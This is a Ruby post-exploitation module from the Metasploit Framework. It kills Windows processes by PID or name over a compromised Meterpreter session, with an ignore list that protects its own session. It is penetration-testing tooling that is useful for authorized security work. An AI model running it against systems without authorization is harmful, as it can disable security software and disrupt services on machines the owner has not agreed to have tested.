##
# $Id$
##

##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post


	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Kill running processes by PID or name',
			'Description'   => %q{ This module will kill all PIDs matching PIDLIST and/or find
					every process matching the namelist, then kill them. Current session
					PID is ignored, and a whitelist can be passed.
					},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'RageLtMan'],
			'Version'       => '$Revision$',
			'Platform'      => [ 'win' ],
			'SessionTypes'  => [ 'meterpreter']
		))

		register_options(
			[
				OptString.new('PIDLIST', [false, 'List of comma separated PIDs to kill.', '']),
				OptString.new('NAMELIST',[false, 'List of comma separated names to kill', ''])
			], self.class)

		register_advanced_options(
			[
				OptString.new('IGNORE_LIST', [false, 'List of comma separated PIDs to keep.', '']),
			], self.class)
	end

	# Run Method for when run command is issued
	def run
		unless client.platform =~ /win/
			print_error("This module requires native Windows meterpreter functions not compatible with the selected session")
			return
		end
	
		print_status("Running module against #{sysinfo['Computer']}")

		pids = datastore['PIDLIST'].split(',').map {|x| x.to_i}
		namelist = datastore['NAMELIST'].split(',').map {|n| n.strip}
		keep_pids = datastore['IGNORE_LIST'].split(',').map {|x| x.to_i}

		if (pids.empty? and namelist.empty?)
			print_error("Names or PIDS must be entered")
			return
		end

		if namelist and !namelist.empty?
			namelist.each do |name|
				client.sys.process.get_processes.find_all {|p| p['name'] == name }.map do |process|
					vprint_good("Adding #{process['name']} with PID #{process['pid']}")
					pids << process['pid'].to_i
				end
			end
		end
		# Suicide prevention and ignore list 
		pids = pids - keep_pids - [client.sys.process.getpid]

		pids.each do |pid|
			vprint_good("Killing #{pid}")
			client.sys.process.kill(pid)
		end

	end

	
end
